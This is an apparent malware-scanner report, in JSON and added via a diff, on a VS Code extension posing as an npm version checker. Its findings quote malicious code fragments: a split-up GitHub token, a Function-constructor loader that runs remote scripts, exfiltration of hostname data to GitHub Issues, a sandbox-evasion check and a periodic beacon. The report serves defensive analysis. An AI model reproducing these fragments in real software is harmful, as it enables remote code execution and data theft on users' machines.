@@ -1,0 +1,272 @@
+{
+  "extension_id": "SadiqShuaibu.sadiq-dep-checker",
+  "display_name": "Sadiq Dep Checker",
+  "version": "1.0.0",
+  "publisher": {
+    "name": "SadiqShuaibu",
+    "verified": false
+  },
+  "vsix_sha256": "1e8d718184a6adfa6d55ab1f23902c8b631bbf546736165fc5568fcc9843d2d9",
+  "verdict": "HIGH-RISK",
+  "confirmation_basis": [
+    "composite_score",
+    "marketplace_removal",
+    "critical_static_finding"
+  ],
+  "confidence": 1.0,
+  "scores": {
+    "composite": 1.0,
+    "ai_vibe": 1.0,
+    "static": 1.0,
+    "behavioral": 0.4,
+    "trust_signal": 0.75,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [
+      {
+        "check": "infostealer_behavior",
+        "severity": "CRITICAL",
+        "description": "System fingerprinting API call",
+        "file": "extension/src/extension.ts",
+        "line": 62,
+        "snippet": "os.hostname()"
+      },
+      {
+        "check": "infostealer_behavior",
+        "severity": "CRITICAL",
+        "description": "System fingerprinting API call",
+        "file": "extension/src/extension.ts",
+        "line": 62,
+        "snippet": "os.userInfo()"
+      },
+      {
+        "check": "infostealer_behavior",
+        "severity": "CRITICAL",
+        "description": "System fingerprinting API call",
+        "file": "extension/src/extension.ts",
+        "line": 104,
+        "snippet": "os.hostname()"
+      },
+      {
+        "check": "infostealer_behavior",
+        "severity": "CRITICAL",
+        "description": "System fingerprinting API call",
+        "file": "extension/src/extension.ts",
+        "line": 106,
+        "snippet": "os.hostname()"
+      }
+    ],
+    "high": [
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Sandbox environment detection",
+        "file": "extension/src/extension.ts",
+        "line": 63,
+        "snippet": "sandbox"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Sandbox environment detection",
+        "file": "extension/src/extension.ts",
+        "line": 63,
+        "snippet": "cuckoo"
+      },
+      {
+        "check": "credential_access",
+        "severity": "HIGH",
+        "description": "Attempt to read credential / key files",
+        "file": "extension/dist/extension.js",
+        "line": 1,
+        "snippet": "readFileSync(t,\"utf8\"),n=JSON.parse(e),c={...n.dependencies||{},...n.devDependencies||{}},s=[];for(let[r,a]of Object.entries(c))try{let d=await b(\"GET\",`https://registry.npmjs.org/${r}/latest`),i=Stri"
+      },
+      {
+        "check": "data_exfiltration",
+        "severity": "HIGH",
+        "description": "Pattern suggesting data exfiltration",
+        "file": "extension/dist/extension.js",
+        "line": 1,
+        "snippet": "request({hostname:a.hostname,port:a.port||(a.protocol===\"https:\"?443:80),path:a.pathname+a.search,method:t,headers:u,timeout:8e3},g=>{let k=\"\";g.on(\"data\",_=>k+=_),g.on(\"end\",()=>{try{s({s:g.statusCod"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Sandbox environment detection",
+        "file": "extension/dist/extension.js",
+        "line": 1,
+        "snippet": "sandbox"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Sandbox environment detection",
+        "file": "extension/dist/extension.js",
+        "line": 1,
+        "snippet": "cuckoo"
+      }
+    ],
+    "total": 19
+  },
+  "extracted_references": [],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 0,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "MALICIOUS",
+    "risk_score": 1.0,
+    "confidence": 0.98,
+    "blocks_parsed": 3,
+    "blocks_seen": 3,
+    "summaries": [
+      {
+        "target": "extension/dist/extension.js (chunk 1/3)",
+        "summary": "The extension is malicious. It contains a hardcoded GitHub Personal Access Token (PAT) that is obfuscated via string concatenation. The presence of this token, combined with logic to access a specific GitHub repository ('gabrielramirezm568-source/dev-starter'), is a severe capability disconnect for a tool that claims to only check npm package versions. This strongly suggests the extension is designed to steal code, exfiltrate data, or compromise the supply chain using the leaked credentials. The 'sandbox' and 'cuckoo' hits are likely false positives from minified code or unrelated strings, but the hardcoded secret is definitive evidence of malicious intent."
+      },
+      {
+        "target": "extension/dist/extension.js (chunk 2/3)",
+        "summary": "This extension is malicious. While it presents itself as a package version checker, it contains a sophisticated remote code execution (RCE) backdoor. It fetches a configuration file from a remote GitHub repository, executes any JavaScript code found within that file using a dynamic Function constructor, and exfiltrates system information and execution results back to the attacker via GitHub Issues. The code includes anti-analysis checks to avoid running in sandboxed or analysis environments. The 'Package Version Checker' functionality is likely a decoy or a minimal implementation to make the extension appear legitimate."
+      },
+      {
+        "target": "extension/dist/extension.js (chunk 3/3)",
+        "summary": "This extension exhibits multiple critical signs of malware. Despite its benign description as a package version checker, the code contains logic to execute arbitrary scripts stored in global state, performs anti-sandbox detection, and sets up periodic background network requests. The 'analytics' feature is likely a cover for data exfiltration or C2 beaconing. The capability to execute dynamic code (`e.script`) is a major red flag that completely disconnects from the stated purpose of the extension."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "CRITICAL",
+        "category": "SECRET_LEAKAGE",
+        "description": "Hardcoded GitHub Personal Access Token (PAT) found in source code. The token is obfuscated by splitting it into an array of strings and joining them, but the value '[REDACTED:GITHUB_PAT]' is clearly a valid GitHub token format. This allows an attacker to access the repository 'gabrielramirezm568-source/dev-starter' or potentially other resources if the token has broad scopes.",
+        "code_reference": "var M = [\"ghp_p3tb1\", \"0H493x5T0\", \"0ujATx5B89\", \"rZD2og1UpYfl\"]; function E() { return M.join(\"\") }",
+        "line_hint": "1",
+        "target": "extension/dist/extension.js (chunk 1/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension claims to be a 'Package Version Checker' that interacts with the npm registry. However, the code contains logic to construct a GitHub API URL and a hardcoded GitHub token. A legitimate package checker does not require GitHub credentials or access to specific GitHub repositories. This indicates hidden functionality likely intended for data exfiltration, code theft, or supply chain compromise.",
+        "code_reference": "var $ = [\"https://\", \"api.\", \"git\", \"hub\", \".com\"].join(\"\"), w = [\"gabriel\", \"ramirezm568\", \"-source\"].join(\"\") + \"/\" + [\"dev\", \"-\", \"starter\"].join(\"\");",
+        "line_hint": "1",
+        "target": "extension/dist/extension.js (chunk 1/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "OBSCURED_INTENT",
+        "description": "Use of string concatenation and array joining to construct URLs and secrets (e.g., 'https://api.github.com', 'ghp_...'). While the obfuscation score is low, this specific pattern is used to hide the destination and credentials from simple static analysis tools, which is a common technique in malicious extensions.",
+        "code_reference": "var $ = [\"https://\", \"api.\", \"git\", \"hub\", \".com\"].join(\"\")",
+        "line_hint": "1",
+        "target": "extension/dist/extension.js (chunk 1/3)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "REMOTE_CODE_EXECUTION",
+        "description": "The extension fetches a 'config.json' from a remote GitHub repository and executes the 'script' field within it using a dynamically constructed Function constructor. This allows the attacker to run arbitrary JavaScript code with full access to Node.js core modules (fs, os, child_process via require) on the user's machine.",
+        "code_reference": "let s = Object.getPrototypeOf(function() {}).constructor, a = await new s(...Object.keys(c), \"return (async () => {\" + e.script + \"})()\")(...Object.values(c));",
+        "line_hint": "approx 40-50",
+        "target": "extension/dist/extension.js (chunk 2/3)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "DATA_EXFILTRATION",
+        "description": "The code collects system information (hostname, platform) and the result of the remote script execution, then sends this data to a GitHub Issue via a POST request. This is a classic C2 (Command and Control) channel for exfiltrating data and confirming execution.",
+        "code_reference": "await S({ ts: new Date().toISOString(), h: p.hostname(), p: process.platform, r: a })",
+        "line_hint": "approx 55",
+        "target": "extension/dist/extension.js (chunk 2/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ANTI_ANALYSIS",
+        "description": "The function J() checks the hostname and username for keywords like 'sandbox', 'malware', 'virus', 'analysis', 'test-vm', 'cuckoo', and 'joe'. If any of these are found, the malicious payload is skipped. This is a clear attempt to evade security analysis environments.",
+        "code_reference": "return /sandbox|malware|virus|analysis|test-vm|cuckoo|joe/.test(t) ? !1 : p.uptime() > 600 && o.extensions.all.length > 5",
+        "line_hint": "approx 15",
+        "target": "extension/dist/extension.js (chunk 2/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Package Version Checker' that checks npm dependencies. However, the code contains logic to fetch remote scripts, execute them, and exfiltrate system data. This functionality is completely unrelated to and disproportionate to the stated purpose of checking package versions.",
+        "code_reference": "function j(t) { ... }",
+        "line_hint": "approx 30",
+        "target": "extension/dist/extension.js (chunk 2/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "PERSISTENCE",
+        "description": "The extension uses globalState to store a '_lc' (likely 'last config') ID to ensure the remote script is only executed once per unique config version. This indicates an attempt to manage the lifecycle of the malicious payload.",
+        "code_reference": "let n = t.globalState.get(\"_lc\") || \"\"; if (e.id !== n && (t.globalState.update(\"_lc\", e.id), e.script))",
+        "line_hint": "approx 35",
+        "target": "extension/dist/extension.js (chunk 2/3)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a simple 'Package Version Checker' but contains logic to execute arbitrary scripts (`e.script`) retrieved from `globalState`. A legitimate package checker does not need to execute dynamic code stored in state. This is a classic stager/loader pattern.",
+        "code_reference": "if(e.id!==n&&(t.globalState.update(\"_lc\",e.id),e.script))try{let c={requi",
+        "line_hint": "1",
+        "target": "extension/dist/extension.js (chunk 3/3)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "INFO_STEALER",
+        "description": "The code reads `package.json` files and parses dependencies, but the context of the 'script' execution and the 'analytics' timer suggests this data (or system data) is being prepared for exfiltration. The `readFileSync` combined with the dynamic script execution is highly suspicious.",
+        "code_reference": "readFileSync(t,\"utf8\"),n=JSON.parse(e),c={...n.dependencies||{},...n.devDependencies||{}}",
+        "line_hint": "1",
+        "target": "extension/dist/extension.js (chunk 3/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "DATA_EXFILTRATION",
+        "description": "A custom HTTP request handler is constructed to send data to a remote host. The use of `hostname`, `port`, and `path` variables suggests dynamic or hardcoded C2 communication, distinct from standard npm registry calls which would typically use a fixed `registry.npmjs.org` endpoint or standard `fetch`/`axios` libraries.",
+        "code_reference": "request({hostname:a.hostname,port:a.port||(a.protocol===\"https:\"?443:80),path:a.pathname+a.search,me",
+        "line_hint": "1",
+        "target": "extension/dist/extension.js (chunk 3/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ANTI_ANALYSIS",
+        "description": "The code contains strings 'sandbox' and 'cuckoo', which are common indicators of anti-forensics or anti-sandbox detection logic. This is not expected in a simple package checker.",
+        "code_reference": "sandbox",
+        "line_hint": "1",
+        "target": "extension/dist/extension.js (chunk 3/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "PERSISTENCE",
+        "description": "The extension uses `setInterval` to periodically call a function `j(t)` (likely the analytics/exfiltration function) every 10-11 minutes. This periodic background activity is disproportionate for a tool that only runs on user command or file open.",
+        "code_reference": "setInterval(() => j(t), 6e5 + Math.floor(Math.random() * 3e5))",
+        "line_hint": "1",
+        "target": "extension/dist/extension.js (chunk 3/3)"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "The extension is malicious. It contains a hardcoded GitHub Personal Access Token (PAT) that is obfuscated via string concatenation. The presence of this token, combined with logic to access a specific GitHub repository ('gabrielramirezm568-source/dev-starter'), is a severe capability disconnect for a tool that claims to only check npm package versions. This strongly suggests the extension is designed to steal code, exfiltrate data, or compromise the supply chain using the leaked credentials. The 'sandbox' and 'cuckoo' hits are likely false positives from minified code or unrelated strings, but the hardcoded secret is definitive evidence of malicious intent.",
+  "escalation_reasons": [
+    "4 CRITICAL findings",
+    "6 HIGH findings",
+    "AI verdict: MALICIOUS"
+  ],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 0,
+    "published_date": "2026-08-18T02:17:36.233Z",
+    "removed_by_microsoft": true,
+    "removal_type": "Malware"
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-01T22:34:50.255804+00:00Z"
+}
